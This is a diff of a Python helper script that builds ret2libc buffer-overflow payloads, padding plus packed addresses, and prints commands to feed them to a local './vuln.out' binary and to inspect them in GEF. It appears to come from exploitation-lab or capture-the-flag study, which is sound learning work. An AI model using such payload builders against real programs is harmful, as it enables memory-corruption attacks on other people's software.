@@ -1,12 +1,4 @@
 #!/usr/bin/env python3
-"""Build a ret2libc payload.
-
-Usage: build_payload.py <padding_len> <arg> [<arg> ...]
-
-Each <arg> after the padding length is either:
-  - a hex address, e.g. 0xf7dc8ce0  -> packed as 4 little-endian bytes
-  - plain text, e.g. BBBB          -> appended as raw ASCII bytes
-"""
 import sys
 
 
@@ -48,18 +40,42 @@ def main():
     print()
     print("Run this to start:")
     print()
-    payload_expression = f"b'A'*{offset} + {payload[offset:]!r}"
+    payload_parts = [f'b"A"*{offset}']
+    for arg in args:
+        encoded_arg = encode_arg(arg)
+        if is_hex_arg(arg):
+            payload_parts.append(f"bytes.fromhex({encoded_arg.hex()!r})")
+        else:
+            payload_parts.append(repr(encoded_arg))
+    payload_expression = " + ".join(payload_parts)
     print("python3 -c \"import subprocess; subprocess.run(['./vuln.out', "
             f"{payload_expression}])\"")
     print()
-    print("Run this at the GEF prompt to inspect the payload:")
+    print("Run this at the GEF prompt to inspect the payload (hex, handles NUL bytes):")
     gdb_command = (
         "run $(python3 -c 'import sys; "
-        f'sys.stdout.buffer.write(b"A"*{offset} + '
-        f'bytes.fromhex("{payload[offset:].hex()}"))'
+        f"sys.stdout.buffer.write({payload_expression})"
         "')"
     )
     print(gdb_command)
+    print()
+    print("Standalone Python command:")
+    standalone_parts = [f"'A'*{offset}"]
+    for arg in args:
+        encoded_arg = encode_arg(arg)
+        if is_hex_arg(arg):
+            escaped_arg = "".join(f"\\x{byte:02x}" for byte in encoded_arg)
+        else:
+            escaped_arg = "".join(
+                chr(byte) if 0x20 <= byte <= 0x7e and byte not in (0x27, 0x5c)
+                else "\\'" if byte == 0x27
+                else "\\\\" if byte == 0x5c
+                else f"\\x{byte:02x}"
+                for byte in encoded_arg
+            )
+        standalone_parts.append(f"'{escaped_arg}'")
+    standalone_expression = " + ".join(standalone_parts)
+    print(f'$(python3 -c "print({standalone_expression})")')
 
 
 if __name__ == "__main__":
